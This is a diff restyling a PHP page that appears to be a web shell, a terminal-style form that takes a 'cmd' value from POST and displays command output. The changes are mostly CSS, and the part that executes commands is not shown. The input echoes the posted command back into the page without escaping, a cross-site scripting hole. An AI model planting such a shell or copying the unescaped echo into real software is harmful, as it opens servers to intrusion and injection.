@@ -23,7 +23,7 @@ if (!empty($_POST["cmd"])) {
         box-shadow: none
       }
       .line0 {
-        margin: 0;
+        margin: 0 0 -3px 0;
         font-size: 18px
       }
       #cmd {
@@ -33,9 +33,11 @@ if (!empty($_POST["cmd"])) {
         padding: 0;
         font-size: 18px;
         line-height: 0;
-        height: 18px;
         border: 0 gray solid;
         border-radius: 0
+        background: none!important;
+        color: #d9d8bd;
+        height: 23px
       }
       .line1 p {
         display: inline-grid;
@@ -48,11 +50,6 @@ if (!empty($_POST["cmd"])) {
         font-family: font-family: Hack, monospace;
         color: #d9d8bd;
         background-color: #000
-      }
-      #cmd {
-        background: 0 0;
-        color: #d9d8bd;
-        height: 17px
       }
       h2 {
         color: rgba(0, 0, 0, .75)
@@ -91,13 +88,13 @@ if (!empty($_POST["cmd"])) {
               <strong>~</strong>
               <strong>]</strong>
             </label>
-            <div class="line1"><p>└─</p><p>$</p><input name="cmd" id="cmd" type="text" class="form-control" value="<?php if(isset($_POST['cmd'])){ echo $_POST['cmd']; } ?>" required="">
+            <div class="line1"><p>└─</p><p>$</p><input name="cmd" id="cmd" type="text" style="background:none!important" class="form-control" value="<?php if(isset($_POST['cmd'])){ echo $_POST['cmd']; } ?>" required="">
             </div>
           </div>
         </form>
 <?php if ($_SERVER["REQUEST_METHOD"] === "POST"): ?>
 <?php if (isset($cmd)): ?>
-<pre>
+<pre style="white-space: pre-wrap">
 <?=htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") ?>
 </pre>
 <?php else: ?>
